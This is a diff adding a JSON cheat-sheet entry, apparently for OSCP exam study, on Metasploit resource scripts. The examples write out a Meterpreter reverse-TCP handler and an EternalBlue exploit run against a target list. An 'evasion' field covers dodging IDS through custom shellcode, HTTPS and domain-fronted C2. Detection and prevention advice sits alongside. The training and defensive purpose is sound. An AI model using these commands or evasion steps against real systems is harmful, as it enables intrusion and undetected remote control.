@@ -1,0 +1,93 @@
+{
+  "id": "msf-resource-scripts",
+  "name": "Metasploit Resource Scripts (.rc files)",
+  "command": "msfconsole -r setup.rc",
+  "description": "Resource scripts (.rc files) automate sequences of msfconsole commands. They run line-by-line on startup or via the 'resource' command inside a session. Use them to replay a multi-step exploitation workflow, set up multi-handler listeners with all options pre-configured, or document a repeatable attack chain. On the OSCP exam, a well-crafted .rc file for your multi/handler or a post-exploitation sequence can save significant time.",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "metasploit-installed"
+  ],
+  "tools": [
+    "msfconsole"
+  ],
+  "tags": [
+    "metasploit",
+    "automation",
+    "resource-script",
+    "rc-file",
+    "msf"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Metasploit Framework",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 20: The Metasploit Framework (20.4.1 Resource Scripts)",
+  "examples": [
+    {
+      "label": "Create a multi/handler resource script",
+      "command": "cat > handler.rc << 'EOF'\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.49.128\nset LPORT 443\nset ExitOnSession false\nrun -j\nEOF"
+    },
+    {
+      "label": "Launch msfconsole with the resource script",
+      "command": "msfconsole -q -r handler.rc"
+    },
+    {
+      "label": "Run a resource script from inside msfconsole",
+      "command": "resource /path/to/setup.rc"
+    },
+    {
+      "label": "Save current console history as a resource script",
+      "command": "makerc /home/kali/oscp_handler.rc"
+    },
+    {
+      "label": "Multi-step automation example (recon + exploit)",
+      "command": "# recon.rc\ndb_nmap -sV -p 445 192.168.1.0/24\nhosts -c address,os_name\n# exploit.rc (run after recon)\nuse exploit/windows/smb/ms17_010_eternalblue\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.49.128\nset LPORT 4444\nset RHOSTS file:/tmp/targets.txt\nrun"
+    }
+  ],
+  "notes": "makerc inside msfconsole captures your typed history to a .rc file \u2014 useful for creating a replay script after finding a working attack chain. Resource scripts execute each line as a msfconsole command, with ERR lines logged but not stopping execution. Exam tip: prepare a standard handler.rc before the exam starts. The 'run -j' flag runs the handler as a background job so msfconsole stays interactive while waiting for callbacks. Resource scripts themselves are exam-ok to use; the module they invoke may still be msf-one-machine (e.g. exploit/ modules).",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - The Metasploit Framework",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "Metasploit Unleashed - Resource Scripts",
+      "url": "https://www.offsec.com/metasploit-unleashed/msfconsole-commands/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "msf-multi-handler",
+      "rel": "prereq",
+      "note": "Understand multi/handler options before templating them into a .rc file."
+    },
+    {
+      "id": "msf-use-module",
+      "rel": "alternative",
+      "note": "Manual module execution \u2014 resource scripts just automate this sequence."
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1059.004"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Metasploit resource scripts (.rc files) automate sequences of MSF commands \u2014 loading modules, setting options, running exploits, and executing post-exploitation commands. They allow repeatable, scripted exploitation workflows, especially useful for: setting up multi-handler listeners, automating multi-step exploit chains, and rapid deployment across multiple targets. Resource scripts execute the same as interactive commands but in batch mode.",
+    "prerequisites": "Metasploit Framework installed. Resource script (.rc file) with MSF commands. Valid exploit module, payload, LHOST, LPORT configuration. Target reachable from attacker system.",
+    "impact": "T1059.004 Command and Scripting Interpreter: Unix Shell. Automates Metasploit workflows enabling rapid multi-target exploitation and consistent post-exploitation activity. Reduces operator error in multi-step exploit chains.",
+    "detection": "Same as manual Metasploit use: IDS Meterpreter signatures, EDR shellcode detection, network C2 traffic. The resource script automation is not detectable on the target \u2014 only the resulting exploit/payload activity is visible.\nScripting interpreters (powershell.exe, cmd.exe, wscript.exe) executing outside expected time windows or from abnormal user contexts (DET0516).\nShell interpreters (bash, sh, python, perl) initiated by unexpected users or processes chaining netcat/curl/ssh.\nmacOS scripting launched via Terminal/Automator/hidden osascript with unusual parent process.\nESXi busybox shell spawned from SSH unexpectedly; network device CLI from uncommon accounts or unknown IPs.",
+    "artifacts": "IDS: Meterpreter stage download | EDR: shellcode injection | Netflow: Meterpreter C2 protocol | Application crash log | Outbound connection from compromised process to attacker LHOST:LPORT",
+    "prevention": "IPS: Meterpreter signature blocking. EDR: shellcode injection detection. Network: block outbound to non-corporate IPs (egress filtering). Patch exploited vulnerabilities. Network segmentation limiting attack surface.\nAntivirus/Antimalware: Auto-quarantine of malicious scripting interpreter activity.\nAudit: Inventory interpreter usage to detect unexpected scripting binaries.\nBehavior Prevention on Endpoint: Windows 10 ASR rules blocking VBScript and JScript execution.\nCode Signing: Permit only signed scripts; block unsigned interpreter executions.\nDisable or Remove Feature or Program: Remove unused shells and scripting interpreters.\nExecution Prevention: Application control (WDAC/AppLocker); PowerShell Constrained Language Mode (restrict Add-Type).\nPrivileged Account Management: Restrict PowerShell execution policy to admins; use PowerShell Just Enough Administration (JEA).\nRestrict Web-Based Content: Script-blocking browser extensions and ad blockers.",
+    "evasion": "Use custom shellcode instead of default Meterpreter to avoid IDS signatures. Encrypt C2 over HTTPS (443). Use a domain-fronted C2 endpoint. Change default Meterpreter port from 4444.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1059/004/"
+    ],
+    "misconfiguration": "No IPS signatures for Meterpreter protocol. No egress filtering from server networks. Default ports (4444) not blocked. No EDR behavioral detection for shellcode injection.",
+    "vulnerable_config": "# Meterpreter default on port 4444 \u2014 easily detectable:\n# Network rule: alert tcp any any -> any 4444 (msg:'Meterpreter Default Port'; sid:9003;)\n# \u2192 Default config trivially detected\n\n# No egress filtering:\n# allow ip internal_net any\n# \u2192 Meterpreter can connect back on any port to any destination",
+    "secure_config": "# Egress filtering (deny all, allow exceptions):\n# deny ip server_net any (except corporate_proxies)\n# Require all outbound HTTP/HTTPS from servers to go through authenticated proxy\n# \u2192 Meterpreter reverse shell cannot connect directly to attacker\n\n# IDS/IPS: Meterpreter signature:\n# Snort ET rules: ET TROJAN Metasploit Meterpreter stdapi_sys_process_execute (sid:2019744)\n\n# EDR: Defender for Endpoint detects Meterpreter staging\n# \u2192 Terminate + quarantine on detection"
+  }
+}
